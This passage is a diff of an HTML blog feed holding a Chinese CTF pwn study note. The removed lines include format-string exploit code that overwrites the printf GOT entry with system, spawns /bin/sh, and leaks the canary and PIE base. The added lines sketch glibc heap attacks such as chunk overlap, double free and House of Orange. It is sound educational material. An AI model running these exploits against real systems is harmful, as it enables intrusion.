class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收程序信息，向程序发送payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="非栈上bss段">非栈上(BSS段)</h2>
-<p>2023moeCTF的第三道fmt就是这种题目，exp在本地，后续有时间更新</p>
-<h2 id="特殊情况">特殊情况</h2>
-<h3 id="一次printf就返回">一次printf就返回</h3>
-<blockquote>
-<p>printf 的要求十分严格，通常有两种做法</p>
-</blockquote>
+<p>tip1：高版本的libc库没有 <code>ld-2.23.so</code> 这种文件，但它与
+<code>ld-linux-x86-64.so.2</code>
+等价，都指向相同的动态链接器文件，他们实际上是同一个文件的不同名称。</p>
+<p>tip2：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被patch的elf文件: Pwn</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器 ld.so</span></span><br><span class="line">patchelf --set-interpreter path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 pwn </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置链接库</span> </span><br><span class="line">patchelf --set-rpath  path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ pwn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器与动态链接库</span></span><br><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure>
+<h1 id="chunk-extend-and-overlapping">Chunk Extend and Overlapping</h1>
+<p>本质是通过修改 chunk_header 来实现用 chunk1 控制 chunk2
+的内容的效果。分为前向和后向两种</p>
+<h2 id="后向-overlap">后向 Overlap</h2>
+<p>堆区模型： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---chunk1(0x21)---</span><br><span class="line">---chunk2(0x21)---</span><br></pre></td></tr></table></figure></p>
+<p>本质：修改低地址 chunk1 的 size 域，在修改 chunk1 内容时会越界修改掉
+chunk2 的内容</p>
+<h2 id="前向-overlap">前向 Overlap</h2>
+<p>堆区模型： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---chunk1(0x81)---</span><br><span class="line">---chunk2(0x21)---</span><br><span class="line">---chunk3(0x21)---</span><br><span class="line">---chunk4(0x81)---</span><br><span class="line">---chunk5(0x21)---防止 top_chunk 合并</span><br></pre></td></tr></table></figure></p>
+<p>本质：修改高地址 chunk4 的 pre_inuse 域和 prev_size 域，通过 free 时
+bins 的机制来进行前向合并 chunk1 ，从而再次 malloc 时可以控制中间的
+chunk2 与 chunk3</p>
+<h1 id="use-after-free">Use After Free</h1>
+<p>概述：在<code>free(chunk_ptr)</code>后并没有<code>chunk_ptr=0</code>，导致我们仍然能通过<code>chunk_ptr</code>对这个chunk进行修改</p>
+<h1 id="double-free">Double Free</h1>
+<h2 id="概述">概述</h2>
+<p>libc2.27之前，主要是 fastbin double free</p>
+<p>libc2.27-2.28，主要是 tcachebin double free</p>
+<p>libc2.29-libc2.31，tcachebin加入了检查机制，所以仍然考虑用
+fastbin/smallbin</p>
+<h2 id="根据-libc-版本进行分类">根据 Libc 版本进行分类</h2>
+<h3 id="libc2.29-libc2.31">Libc2.29-Libc2.31</h3>
+<h1 id="kinds-of-bin">Kinds of Bin</h1>
+<h2 id="tcachebin">Tcachebin</h2>
+<h2 id="fastbin">Fastbin</h2>
+<h2 id="unsortedbin">Unsortedbin</h2>
+<p>当unsortedbin中有且仅有一个chunk时，该chunk的fd和bk会指向unsortdedbin的地址</p>
+<p>而这个地址可以用ida查看对应libc的malloc_trim函数找到，从而帮助计算
+libc_base</p>
+<h3 id="write">write</h3>
+<p>write是指</p>
+<p>此外，低libc版本的unsortedbin可以像tcachebin一样，通过伪造链来申请一个fake_chunk</p>
+<ul>
+<li>申请fake_chunk <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">**2.23版本**  </span><br><span class="line">- 初状态  </span><br><span class="line">unsortedbin --&gt; chunk_victim  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">此时我们令chunk_victim.bk = fake_chunk_head</span></span><br><span class="line"></span><br><span class="line">- 末状态  </span><br><span class="line">unsortedbin  --&gt; chunk_victim --&gt; fake_chunk</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">连续申请两个chunk即可申请到fake_chunk</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="largebin-attack">Largebin Attack</h2>
+<h1 id="kinds-of-house">Kinds of House</h1>
+<h2 id="houseoforange">HouseofOrange</h2>
+<h3 id="概述-1">概述</h3>
+<p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。</p>
+<h3 id="伪造chunk需求">伪造chunk需求</h3>
 <ol type="1">
-<li>要求：栈上有一串具有三个函数的rbp的链，NO PIE，libc已知
-<ol type="1">
-<li>做法：在栈上布满one_gadget，然后找到一条带有3个rbp的链，修改中间一个
-node 的低字节，让其指向的rbp变低，进而在返回时可以直接返回og</li>
-</ol></li>
-<li><a
-href="https://www.freebuf.com/articles/system/385029.html">打fini_array（未学习）</a></li>
+<li><p>top_chunk的结束地址必须页对齐</p>
+<ul>
+<li>一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可</li>
+</ul></li>
+<li><p>top_chunk.size &gt;= MINSIZE</p></li>
+<li><p>top_chunk.size &lt; chunk_size + MINSIZE</p></li>
+<li><p>top_chunk.prev_inuse == 1</p>
+<ul>
+<li>第一点中说的0xfe0要变为0xfe1</li>
+</ul></li>
 </ol>
-<h3 id="full-relro">FULL RELRO</h3>
-<blockquote>
-<p>FULL RELRO 意味着我们不能修改 got 表，所以我们需要修改返回地址</p>
-</blockquote>
-<p>要求：可以 printf
-的次数较多(至少多于四次)，可以让我们将返回地址修改为 one_gadget</p>
-<h3 id="piecanary-bypass">PIE/Canary bypass</h3>
-<blockquote>
-<p>假设调用链为 main-&gt;func-&gt;printf，而在 func 中存放着 fmt，则栈中
-fmt
-上方不远处一定有调用printf语句的下一句(PC+4)，即返回地址，和canary</p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">假设偏移量为6，栈构造如下</span><br><span class="line">---printf栈帧---</span><br><span class="line">................</span><br><span class="line"> printf_canary    &lt;- offset = 3</span><br><span class="line">   printf_rbp     &lt;- offset = 4</span><br><span class="line">printf_ret_addr   &lt;- offset = 5</span><br><span class="line">---printf栈帧---</span><br><span class="line"></span><br><span class="line">----func栈帧----</span><br><span class="line">      fmt         &lt;- offset = 6</span><br><span class="line">----func栈帧----</span><br><span class="line"></span><br><span class="line">----main栈帧----</span><br><span class="line">...............</span><br><span class="line">----main栈帧----</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">泄露 pie_base &amp; canary</span></span><br><span class="line">payload = &#x27;%3$p-%5$p-END&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">func_addr,canary = [int(x,16) for x in io.recvuntil(&#x27;END&#x27;)[-35:-4].split(b&#x27;-&#x27;)]</span><br><span class="line">ret_offset = </span><br><span class="line">pie_base   = func_addr - ret_offset</span><br></pre></td></tr></table></figure>
-<h1 id="appendix">Appendix</h1>
-<h2
-id="pwnlib.fmtstr.fmtstr_payload源码">pwnlib.fmtstr.fmtstr_payload源码</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_payload</span> (</span><br><span class="line">        offset,              <span class="comment"># 字符串在栈上的偏移量</span></span><br><span class="line">        writes,              <span class="comment"># &#123;target_addr:int_to_write&#125; 要写入的数字</span></span><br><span class="line">        numbwritten=<span class="number">0</span>,       <span class="comment"># printf 已经打印的字符数量</span></span><br><span class="line">        write_size=<span class="string">&#x27;byte&#x27;</span>,   <span class="comment"># 写入字节的大小</span></span><br><span class="line">        write_size_max=<span class="string">&#x27;long&#x27;</span>, <span class="comment"># </span></span><br><span class="line">        overflows=<span class="number">16</span>,        <span class="comment"># </span></span><br><span class="line">        strategy=<span class="string">&quot;small&quot;</span>,    <span class="comment"># 默认small，如果追求速度可以用fast模式</span></span><br><span class="line">        badbytes=<span class="built_in">frozenset</span>(),  <span class="comment"># </span></span><br><span class="line">        offset_bytes=<span class="number">0</span>,      <span class="comment"># </span></span><br><span class="line">        no_dollars=<span class="literal">False</span>     <span class="comment"># 是否有 $ 符号,比如不用 &#x27;%996$n&#x27;</span></span><br><span class="line">    ):</span><br><span class="line"></span><br><span class="line">    sz = WRITE_SIZE[write_size]</span><br><span class="line">    szmax = WRITE_SIZE[write_size_max]</span><br><span class="line">    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)</span><br><span class="line"></span><br><span class="line">    fmt = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        data_offset = (offset_bytes + <span class="built_in">len</span>(fmt)) // context.<span class="built_in">bytes</span></span><br><span class="line">        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)</span><br><span class="line">        fmt = fmt + cyclic((-<span class="built_in">len</span>(fmt)-offset_bytes) % context.<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(fmt) + offset_bytes == data_offset * context.<span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;this is a bug ... format string building did not converge&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fmt + data</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>CTF_Theory</category>
